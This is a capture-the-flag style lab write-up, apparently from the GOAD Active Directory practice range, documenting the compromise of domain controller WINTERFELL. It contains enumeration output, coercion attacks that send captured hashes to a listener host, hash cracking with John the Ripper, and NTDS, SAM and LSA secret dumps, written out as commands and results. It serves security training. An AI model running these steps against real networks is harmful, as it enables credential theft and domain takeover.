---
title: GOAD - North.SevenKingdoms.local
---

# GOAD: North.Sevenkingdom.local (DC02)

!!! info
    Created by: Dcyberguy

    Created time: October 31, 2025 9:32 PM

    Last edited by: Dcyberguy

    Last updated time: December 5, 2025 4:07 PM

    Status: In progress

``` bash
Host Information

Host IP: 10.10.10.11  
DNS Name(s): winterfell.north.sevenkingdoms.local, winterfell
```

## Enumeration

Document all enumeration don on the host to find vulnerable and attack paths

```bash
nmap -Pn -sV -sC -p- --min-rate=200 10.10.10.11 -T4
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-24 20:43 EST
Nmap scan report for 10.10.10.11
Host is up (0.00024s latency).
Not shown: 65508 closed tcp ports (conn-refused)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-25 02:33:52Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=winterfell.north.sevenkingdoms.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:winterfell.north.sevenkingdoms.local
| Not valid before: 2025-10-18T19:53:39
|_Not valid after:  2026-10-18T19:53:39
|_ssl-date: 2025-11-25T02:34:48+00:00; +49m15s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-25T02:34:48+00:00; +49m15s from scanner time.
| ssl-cert: Subject: commonName=winterfell.north.sevenkingdoms.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:winterfell.north.sevenkingdoms.local
| Not valid before: 2025-10-18T19:53:39
|_Not valid after:  2026-10-18T19:53:39
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-25T02:34:48+00:00; +49m15s from scanner time.
| ssl-cert: Subject: commonName=winterfell.north.sevenkingdoms.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:winterfell.north.sevenkingdoms.local
| Not valid before: 2025-10-18T19:53:39
|_Not valid after:  2026-10-18T19:53:39
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=winterfell.north.sevenkingdoms.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:winterfell.north.sevenkingdoms.local
| Not valid before: 2025-10-18T19:53:39
|_Not valid after:  2026-10-18T19:53:39
|_ssl-date: 2025-11-25T02:34:48+00:00; +49m15s from scanner time.
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-11-25T02:34:48+00:00; +49m15s from scanner time.
| ssl-cert: Subject: commonName=winterfell.north.sevenkingdoms.local
| Not valid before: 2025-10-17T19:07:41
|_Not valid after:  2026-04-18T19:07:41
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
| tls-alpn: 
|_  http/1.1
|_http-title: Not Found
|_ssl-date: 2025-11-25T02:34:48+00:00; +49m15s from scanner time.
| ssl-cert: Subject: commonName=VAGRANT
| Subject Alternative Name: DNS:VAGRANT, DNS:vagrant
| Not valid before: 2025-10-17T10:49:59
|_Not valid after:  2028-10-16T10:49:59
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49687/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49688/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49698/tcp open  msrpc         Microsoft Windows RPC
49730/tcp open  msrpc         Microsoft Windows RPC
49845/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: WINTERFELL; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 49m14s, deviation: 0s, median: 49m14s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-11-25T02:34:40
|_  start_date: N/A
|_nbstat: NetBIOS name: WINTERFELL, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:02:cb:41 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 115.86 seconds
```

### Users Enumeration

```bash
nxc smb 10.10.10.11 --users
SMB         10.10.10.11     445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         10.10.10.11     445    WINTERFELL       -Username-                    -Last PW Set-       -BadPW- -Description-              
SMB         10.10.10.11     445    WINTERFELL       Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         10.10.10.11     445    WINTERFELL       arya.stark                    2025-10-31 23:47:19 0       Arya Stark 
SMB         10.10.10.11     445    WINTERFELL       sansa.stark                   2025-10-31 23:47:28 0       Sansa Stark 
SMB         10.10.10.11     445    WINTERFELL       brandon.stark                 2025-10-31 23:47:31 0       Brandon Stark 
SMB         10.10.10.11     445    WINTERFELL       rickon.stark                  2025-10-31 23:47:33 0       Rickon Stark 
SMB         10.10.10.11     445    WINTERFELL       hodor                         2025-10-31 23:47:35 0       Brainless Giant 
SMB         10.10.10.11     445    WINTERFELL       jon.snow                      2025-10-31 23:47:37 0       Jon Snow 
SMB         10.10.10.11     445    WINTERFELL       samwell.tarly                 2025-10-31 23:47:39 0       Samwell Tarly (Password : Heartsbane)
SMB         10.10.10.11     445    WINTERFELL       jeor.mormont                  2025-10-31 23:47:41 0       Jeor Mormont 
SMB         10.10.10.11     445    WINTERFELL       sql_svc                       2025-10-31 23:47:43 0       sql service 
SMB         10.10.10.11     445    WINTERFELL       [*] Enumerated 10 local users: NORTH

```

Found a saved passed for `samwell.tarly`

### Password policy

```bash
nxc smb 10.10.10.11 --pass-pol
SMB         10.10.10.11     445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         10.10.10.11     445    WINTERFELL       [+] Dumping password info for domain: NORTH
SMB         10.10.10.11     445    WINTERFELL       Minimum password length: 5
SMB         10.10.10.11     445    WINTERFELL       Password history length: 24
SMB         10.10.10.11     445    WINTERFELL       Maximum password age: 311 days 2 minutes 
SMB         10.10.10.11     445    WINTERFELL       
SMB         10.10.10.11     445    WINTERFELL       Password Complexity Flags: 000000
SMB         10.10.10.11     445    WINTERFELL           Domain Refuse Password Change: 0
SMB         10.10.10.11     445    WINTERFELL           Domain Password Store Cleartext: 0
SMB         10.10.10.11     445    WINTERFELL           Domain Password Lockout Admins: 0
SMB         10.10.10.11     445    WINTERFELL           Domain Password No Clear Change: 0
SMB         10.10.10.11     445    WINTERFELL           Domain Password No Anon Change: 0
SMB         10.10.10.11     445    WINTERFELL           Domain Password Complex: 0
SMB         10.10.10.11     445    WINTERFELL       
SMB         10.10.10.11     445    WINTERFELL       Minimum password age: 1 day 4 minutes 
SMB         10.10.10.11     445    WINTERFELL       Reset Account Lockout Counter: 5 minutes 
SMB         10.10.10.11     445    WINTERFELL       Locked Account Duration: 5 minutes 
SMB         10.10.10.11     445    WINTERFELL       Account Lockout Threshold: 5
SMB         10.10.10.11     445    WINTERFELL       Forced Log off Time: Not Set

```

There is `5 minute` lockout policy for every 5 failed login attempt.

### Using Enum4linux

```bash
enum4linux 10.10.10.11
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Nov 24 20:51:38 2025

 =========================================( Target Information )=========================================

Target ........... 10.10.10.11
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

 ============================( Enumerating Workgroup/Domain on 10.10.10.11 )============================

[+] Got domain/workgroup name: NORTH

 ================================( Nbtstat Information for 10.10.10.11 )================================

Looking up status of 10.10.10.11
	WINTERFELL      <00> -         M <ACTIVE>  Workstation Service
	NORTH           <00> - <GROUP> M <ACTIVE>  Domain/Workgroup Name
	NORTH           <1c> - <GROUP> M <ACTIVE>  Domain Controllers
	WINTERFELL      <20> -         M <ACTIVE>  File Server Service
	NORTH           <1b> -         M <ACTIVE>  Domain Master Browser

	MAC Address = 00-0C-29-02-CB-41

 ====================================( Session Check on 10.10.10.11 )====================================

[+] Server 10.10.10.11 allows sessions using username '', password ''

 =================================( Getting domain SID for 10.10.10.11 )=================================

Domain Name: NORTH
Domain Sid: S-1-5-21-928725054-1381016483-1750705438

[+] Host is part of a domain (not a workgroup)

 ===================================( OS information on 10.10.10.11 )===================================

[E] Can't get OS info with smbclient

[+] Got OS info for 10.10.10.11 from srvinfo: 
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED

 ========================================( Users on 10.10.10.11 )========================================

index: 0x189f RID: 0x456 acb: 0x00000210 Account: arya.stark	Name: (null)	Desc: Arya Stark
index: 0x18a8 RID: 0x45b acb: 0x00010210 Account: brandon.stark	Name: (null)	Desc: Brandon Stark
index: 0x16fa RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
index: 0x18ab RID: 0x45d acb: 0x00000210 Account: hodor	Name: (null)	Desc: Brainless Giant
index: 0x18b1 RID: 0x460 acb: 0x00000210 Account: jeor.mormont	Name: (null)	Desc: Jeor Mormont
index: 0x18ae RID: 0x45e acb: 0x00040210 Account: jon.snow	Name: (null)	Desc: Jon Snow
index: 0x18aa RID: 0x45c acb: 0x00000210 Account: rickon.stark	Name: (null)	Desc: Rickon Stark
index: 0x18b0 RID: 0x45f acb: 0x00000210 Account: samwell.tarly	Name: (null)	Desc: Samwell Tarly (Password : Heartsbane)
index: 0x18a5 RID: 0x45a acb: 0x00000210 Account: sansa.stark	Name: (null)	Desc: Sansa Stark
index: 0x18b4 RID: 0x461 acb: 0x00000210 Account: sql_svc	Name: (null)	Desc: sql service

user:[Guest] rid:[0x1f5]
user:[arya.stark] rid:[0x456]
user:[sansa.stark] rid:[0x45a]
user:[brandon.stark] rid:[0x45b]
user:[rickon.stark] rid:[0x45c]
user:[hodor] rid:[0x45d]
user:[jon.snow] rid:[0x45e]
user:[samwell.tarly] rid:[0x45f]
user:[jeor.mormont] rid:[0x460]
user:[sql_svc] rid:[0x461]

 ==================================( Share Enumeration on 10.10.10.11 )==================================

do_connect: Connection to 10.10.10.11 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)

	Sharename       Type      Comment
	---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.10.11

 ============================( Password Policy Information for 10.10.10.11 )============================

[+] Attaching to 10.10.10.11 using a NULL share

[+] Trying protocol 139/SMB...

	[!] Protocol failed: Cannot request session (Called Name:10.10.10.11)

[+] Trying protocol 445/SMB...

[+] Found domain(s):

	[+] NORTH
	[+] Builtin

[+] Password Info for Domain: NORTH

	[+] Minimum password length: 5
	[+] Password history length: 24
	[+] Maximum password age: 311 days 2 minutes 
	[+] Password Complexity Flags: 000000

		[+] Domain Refuse Password Change: 0
		[+] Domain Password Store Cleartext: 0
		[+] Domain Password Lockout Admins: 0
		[+] Domain Password No Clear Change: 0
		[+] Domain Password No Anon Change: 0
		[+] Domain Password Complex: 0

	[+] Minimum password age: 1 day 4 minutes 
	[+] Reset Account Lockout Counter: 5 minutes 
	[+] Locked Account Duration: 5 minutes 
	[+] Account Lockout Threshold: 5
	[+] Forced Log off Time: Not Set

[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5

 =======================================( Groups on 10.10.10.11 )=======================================

[+] Getting builtin groups:

group:[Guests] rid:[0x222]
group:[Remote Desktop Users] rid:[0x22b]
group:[Network Configuration Operators] rid:[0x22c]
group:[Performance Monitor Users] rid:[0x22e]
group:[Performance Log Users] rid:[0x22f]
group:[Distributed COM Users] rid:[0x232]
group:[IIS_IUSRS] rid:[0x238]
group:[Cryptographic Operators] rid:[0x239]
group:[Event Log Readers] rid:[0x23d]
group:[Certificate Service DCOM Access] rid:[0x23e]
group:[RDS Remote Access Servers] rid:[0x23f]
group:[RDS Endpoint Servers] rid:[0x240]
group:[RDS Management Servers] rid:[0x241]
group:[Hyper-V Administrators] rid:[0x242]
group:[Access Control Assistance Operators] rid:[0x243]
group:[Remote Management Users] rid:[0x244]
group:[Storage Replica Administrators] rid:[0x246]
group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
group:[Windows Authorization Access Group] rid:[0x230]
group:[Terminal Server License Servers] rid:[0x231]
group:[Users] rid:[0x221]

[+]  Getting builtin group memberships:

Group: IIS_IUSRS' (RID: 568) has member: Couldn't lookup SIDs
Group: Windows Authorization Access Group' (RID: 560) has member: Couldn't lookup SIDs
Group: Users' (RID: 545) has member: Couldn't lookup SIDs
Group: Remote Desktop Users' (RID: 555) has member: Couldn't lookup SIDs
Group: Pre-Windows 2000 Compatible Access' (RID: 554) has member: Couldn't lookup SIDs
Group: Guests' (RID: 546) has member: Couldn't lookup SIDs

[+]  Getting local groups:

group:[Cert Publishers] rid:[0x205]
group:[RAS and IAS Servers] rid:[0x229]
group:[Allowed RODC Password Replication Group] rid:[0x23b]
group:[Denied RODC Password Replication Group] rid:[0x23c]
group:[DnsAdmins] rid:[0x44e]
group:[AcrossTheSea] rid:[0x455]

[+]  Getting local group memberships:

Group: Denied RODC Password Replication Group' (RID: 572) has member: Couldn't lookup SIDs

[+]  Getting domain groups:

group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[DnsUpdateProxy] rid:[0x44f]
group:[Stark] rid:[0x452]
group:[Night Watch] rid:[0x453]
group:[Mormont] rid:[0x454]

[+]  Getting domain group memberships:

Group: 'Stark' (RID: 1106) has member: NORTH\arya.stark
Group: 'Stark' (RID: 1106) has member: NORTH\eddard.stark
Group: 'Stark' (RID: 1106) has member: NORTH\catelyn.stark
Group: 'Stark' (RID: 1106) has member: NORTH\robb.stark
Group: 'Stark' (RID: 1106) has member: NORTH\sansa.stark
Group: 'Stark' (RID: 1106) has member: NORTH\brandon.stark
Group: 'Stark' (RID: 1106) has member: NORTH\rickon.stark
Group: 'Stark' (RID: 1106) has member: NORTH\hodor
Group: 'Stark' (RID: 1106) has member: NORTH\jon.snow
Group: 'Domain Computers' (RID: 515) has member: NORTH\CASTELBLACK$
Group: 'Night Watch' (RID: 1107) has member: NORTH\jon.snow
Group: 'Night Watch' (RID: 1107) has member: NORTH\samwell.tarly
Group: 'Night Watch' (RID: 1107) has member: NORTH\jeor.mormont
Group: 'Group Policy Creator Owners' (RID: 520) has member: NORTH\Administrator
Group: 'Domain Guests' (RID: 514) has member: NORTH\Guest
Group: 'Domain Users' (RID: 513) has member: NORTH\Administrator
Group: 'Domain Users' (RID: 513) has member: NORTH\vagrant
Group: 'Domain Users' (RID: 513) has member: NORTH\krbtgt
Group: 'Domain Users' (RID: 513) has member: NORTH\SEVENKINGDOMS$
Group: 'Domain Users' (RID: 513) has member: NORTH\arya.stark
Group: 'Domain Users' (RID: 513) has member: NORTH\eddard.stark
Group: 'Domain Users' (RID: 513) has member: NORTH\catelyn.stark
Group: 'Domain Users' (RID: 513) has member: NORTH\robb.stark
Group: 'Domain Users' (RID: 513) has member: NORTH\sansa.stark
Group: 'Domain Users' (RID: 513) has member: NORTH\brandon.stark
Group: 'Domain Users' (RID: 513) has member: NORTH\rickon.stark
Group: 'Domain Users' (RID: 513) has member: NORTH\hodor
Group: 'Domain Users' (RID: 513) has member: NORTH\jon.snow
Group: 'Domain Users' (RID: 513) has member: NORTH\samwell.tarly
Group: 'Domain Users' (RID: 513) has member: NORTH\jeor.mormont
Group: 'Domain Users' (RID: 513) has member: NORTH\sql_svc
Group: 'Mormont' (RID: 1108) has member: NORTH\jeor.mormont

 ===================( Users on 10.10.10.11 via RID cycling (RIDS: 500-550,1000-1050) )===================

[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.

 ================================( Getting printer info for 10.10.10.11 )================================

do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED

enum4linux complete on Mon Nov 24 20:51:43 2025

```

I see that the user `(samwell.tarly)` that I found his credential is part of the `Domain Users Group`

### Vulnerabilities:

I was able to discover a number of vulnerabilities that are associated with the `WINTERFELL` machine using `Netexec`

```bash
nxc smb 10.10.10.11 -u samwell.tarly -p Heartsbane -M coerce_plus                                                                 
SMB         10.10.10.11     445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         10.10.10.11     445    WINTERFELL       [+] north.sevenkingdoms.local\samwell.tarly:Heartsbane 
COERCE_PLUS 10.10.10.11     445    WINTERFELL       VULNERABLE, DFSCoerce
COERCE_PLUS 10.10.10.11     445    WINTERFELL       VULNERABLE, PetitPotam
COERCE_PLUS 10.10.10.11     445    WINTERFELL       VULNERABLE, PrinterBug
COERCE_PLUS 10.10.10.11     445    WINTERFELL       VULNERABLE, PrinterBug
COERCE_PLUS 10.10.10.11     445    WINTERFELL       VULNERABLE, MSEven
```

Running all attacks, I got back password hashes for `eddard.stark` , `robb.stark` and the `Administrator` account

```bash
nxc smb 10.10.10.11 -u samwell.tarly -p Heartsbane -M coerce_plus -o LISTENER=10.10.10.131                                           ─╯
SMB         10.10.10.11     445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         10.10.10.11     445    WINTERFELL       [+] north.sevenkingdoms.local\samwell.tarly:Heartsbane 
COERCE_PLUS 10.10.10.11     445    WINTERFELL       VULNERABLE, DFSCoerce
COERCE_PLUS 10.10.10.11     445    WINTERFELL       Exploit Success, netdfs\NetrDfsRemoveRootTarget
COERCE_PLUS 10.10.10.11     445    WINTERFELL       Exploit Success, netdfs\NetrDfsAddStdRoot
COERCE_PLUS 10.10.10.11     445    WINTERFELL       Exploit Success, netdfs\NetrDfsRemoveStdRoot
COERCE_PLUS 10.10.10.11     445    WINTERFELL       VULNERABLE, PetitPotam
COERCE_PLUS 10.10.10.11     445    WINTERFELL       Exploit Success, efsrpc\EfsRpcAddUsersToFile
COERCE_PLUS 10.10.10.11     445    WINTERFELL       VULNERABLE, PrinterBug
COERCE_PLUS 10.10.10.11     445    WINTERFELL       Exploit Success, spoolss\RpcRemoteFindFirstPrinterChangeNotificationEx
COERCE_PLUS 10.10.10.11     445    WINTERFELL       VULNERABLE, MSEven
```

```bash
sudo responder -I eth1                                                                                                               ─╯
[sudo] password for kali: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.5.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

<< SNIP >>
[SMB] NTLMv2-SSP Client   : 10.10.10.11
[SMB] NTLMv2-SSP Username : NORTH\WINTERFELL$
[SMB] NTLMv2-SSP Hash     : WINTERFELL$::NORTH:bf10913df7c0114e:4486FD3E6A73A0939EF75993EEB84738:0101000000000000800AF4ADDA65DC01706A1C6E81F3B59600000000020008004A00350059004F0001001E00570049004E002D0030004E00490043004A005A004900420059005700560004003400570049004E002D0030004E00490043004A005A00490042005900570056002E004A00350059004F002E004C004F00430041004C00030014004A00350059004F002E004C004F00430041004C00050014004A00350059004F002E004C004F00430041004C0007000800800AF4ADDA65DC010600040002000000080030003000000000000000000000000040000041DDF935E26AEBC62CE72382E0BE9955E83D077840709D60BC39E08F16A41EFB0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310030002E003100330031000000000000000000

<< SNIP >>
[SMB] NTLMv2-SSP Client   : fe80::5ce:7944:e1a:46dd
[SMB] NTLMv2-SSP Username : NORTH\eddard.stark
[SMB] NTLMv2-SSP Hash     : eddard.stark::NORTH:b59951e9dff1ac02:6FF4C58A937C20C11FA152CBFB94CE53:0101000000000000800AF4ADDA65DC01B157D99482CD820000000000020008004A00350059004F0001001E00570049004E002D0030004E00490043004A005A004900420059005700560004003400570049004E002D0030004E00490043004A005A00490042005900570056002E004A00350059004F002E004C004F00430041004C00030014004A00350059004F002E004C004F00430041004C00050014004A00350059004F002E004C004F00430041004C0007000800800AF4ADDA65DC010600040002000000080030003000000000000000000000000030000041DDF935E26AEBC62CE72382E0BE9955E83D077840709D60BC39E08F16A41EFB0A001000000000000000000000000000000000000900140063006900660073002F004D006500720065006E000000000000000000

<< SNIP >>
[SMB] NTLMv2-SSP Client   : fe80::5ce:7944:e1a:46dd
[SMB] NTLMv2-SSP Username : NORTH\robb.stark
[SMB] NTLMv2-SSP Hash     : robb.stark::NORTH:218fd664f14b7a4e:853E54E69F87630F9FC6C0186BDD5E12:0101000000000000800AF4ADDA65DC013FCC9152036A475E00000000020008004A00350059004F0001001E00570049004E002D0030004E00490043004A005A004900420059005700560004003400570049004E002D0030004E00490043004A005A00490042005900570056002E004A00350059004F002E004C004F00430041004C00030014004A00350059004F002E004C004F00430041004C00050014004A00350059004F002E004C004F00430041004C0007000800800AF4ADDA65DC010600040002000000080030003000000000000000000000000030000041DDF935E26AEBC62CE72382E0BE9955E83D077840709D60BC39E08F16A41EFB0A001000000000000000000000000000000000000900160063006900660073002F0042007200610076006F0073000000000000000000
```

Save all the above `NTLMv2-SSP` hash(es) to a file and try to `brute-force` it using `John The Ripper`.

I was able to crack `robb.stark` credentials and `pwned` the `WINTERFELL` machine

```bash
john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt robb-stark.hash                                                                                   ─╯
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sexywolfy        (robb.stark)     
1g 0:00:00:00 DONE (2025-12-05 12:25) 2.325g/s 3019Kp/s 3019Kc/s 3019KC/s shaker21..sexytime1234
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 

```

`Pwned`

### Enumeration WINTERFELL with Robb.stark's creds

```bash
nxc smb 10.10.10.11 -u 'robb.stark' -p 'sexywolfy'                                                                                                                    
SMB         10.10.10.11     445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         10.10.10.11     445    WINTERFELL       [+] north.sevenkingdoms.local\robb.stark:sexywolfy (Pwn3d!)


nxc smb 10.10.10.11 -u 'robb.stark' -p 'sexywolfy' --shares                                                                                                           
SMB         10.10.10.11     445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         10.10.10.11     445    WINTERFELL       [+] north.sevenkingdoms.local\robb.stark:sexywolfy (Pwn3d!)
SMB         10.10.10.11     445    WINTERFELL       [*] Enumerated shares
SMB         10.10.10.11     445    WINTERFELL       Share           Permissions     Remark
SMB         10.10.10.11     445    WINTERFELL       -----           -----------     ------
SMB         10.10.10.11     445    WINTERFELL       ADMIN$          READ,WRITE      Remote Admin
SMB         10.10.10.11     445    WINTERFELL       C$              READ,WRITE      Default share
SMB         10.10.10.11     445    WINTERFELL       IPC$            READ            Remote IPC
SMB         10.10.10.11     445    WINTERFELL       NETLOGON        READ,WRITE      Logon server share 
SMB         10.10.10.11     445    WINTERFELL       SYSVOL          READ,WRITE      Logon server share 
```


Because Robb.stark is admin, he can get the hashes for all users. like the one from `eddard.stark`

```bash
nxc smb 10.10.10.11 -u 'robb.stark' -p 'sexywolfy' --ntds --user eddard.stark                                                                                         ─╯
SMB         10.10.10.11     445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         10.10.10.11     445    WINTERFELL       [+] north.sevenkingdoms.local\robb.stark:sexywolfy (Pwn3d!)
SMB         10.10.10.11     445    WINTERFELL       [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         10.10.10.11     445    WINTERFELL       eddard.stark:1111:aad3b435b51404eeaad3b435b51404ee:d977b98c6c9282c5c478be1d97b237b8:::
SMB         10.10.10.11     445    WINTERFELL       [+] Dumped 1 NTDS hashes to /home/kali/.nxc/logs/ntds/WINTERFELL_10.10.10.11_2025-12-05_155916.ntds of which 1 were added to the database
SMB         10.10.10.11     445    WINTERFELL       [*] To extract only enabled accounts from the output file, run the following command: 
SMB         10.10.10.11     445    WINTERFELL       [*] cat /home/kali/.nxc/logs/ntds/WINTERFELL_10.10.10.11_2025-12-05_155916.ntds | grep -iv disabled | cut -d ':' -f1
SMB         10.10.10.11     445    WINTERFELL       [*] grep -iv disabled /home/kali/.nxc/logs/ntds/WINTERFELL_10.10.10.11_2025-12-05_155916.ntds | cut -d ':' -f1

```


## Foothold

Research findings, data insights, and key considerations and document how you got a foothold on the vulnerable box

### Extracting Hashes from SAM Database

```bash
nxc smb 10.10.10.11 -u 'robb.stark' -p 'sexywolfy' --sam                                                                                                              ─╯
SMB         10.10.10.11     445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         10.10.10.11     445    WINTERFELL       [+] north.sevenkingdoms.local\robb.stark:sexywolfy (Pwn3d!)
SMB         10.10.10.11     445    WINTERFELL       [*] Dumping SAM hashes
SMB         10.10.10.11     445    WINTERFELL       Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::
SMB         10.10.10.11     445    WINTERFELL       Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.10.11     445    WINTERFELL       DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[12:48:52] ERROR    SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.                                   regsecrets.py:436
SMB         10.10.10.11     445    WINTERFELL       [+] Added 3 SAM hashes to the database

```

### **Dumping the Local User’s password hash**

```bash
nxc smb 10.10.10.11 -u 'robb.stark' -p 'sexywolfy' --lsa                                                                                                             
SMB         10.10.10.11     445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         10.10.10.11     445    WINTERFELL       [+] north.sevenkingdoms.local\robb.stark:sexywolfy (Pwn3d!)
SMB         10.10.10.11     445    WINTERFELL       [+] Dumping LSA secrets
SMB         10.10.10.11     445    WINTERFELL       NORTH\WINTERFELL$:aes256-cts-hmac-sha1-96:40aaf0701af5d16a5fd818ecffe11a56a1189474e6d5ed1fc85ca32ce9a6d0a7
SMB         10.10.10.11     445    WINTERFELL       NORTH\WINTERFELL$:aes128-cts-hmac-sha1-96:744c6cf0bd5a1563b9ece25e226defd0
SMB         10.10.10.11     445    WINTERFELL       NORTH\WINTERFELL$:des-cbc-md5:195716ab31896b0e
SMB         10.10.10.11     445    WINTERFELL       NORTH\WINTERFELL$:plain_password_hex:f0bddd1fbd0c86486945b66c7187e1cc7894ae9b8c474fb0696ff202d95438369df613dc4167005425ad3f820c44188b96130a9a0ee3e17ff9103042bf9590b99eb36248fbf1036617fd1cf6c6d8c554b6c675b1044c32ff998c9802b80adb10bec54bf7304e299018e1ec381593a96dd36587f45983ea6158b50648f99998195ce125d194a8b15857b93407f03fe0c16d44fb2213bdc48e6a875a2d00e538919c7e4151c6c744bad8683fd5b21fc8c51decd55236dd423bfa470ec4ee10e638f92ea28b3f20a4bd35c201911060099bbb1bcb1d7f87144b39a4f84694abe0e468c93a9f1e34660bc5bd7576fb4bfe73
SMB         10.10.10.11     445    WINTERFELL       NORTH\WINTERFELL$:aad3b435b51404eeaad3b435b51404ee:5d43c3d692608fef8fab6fb766b2bd10:::
SMB         10.10.10.11     445    WINTERFELL       NORTH\robb.stark:sexywolfy
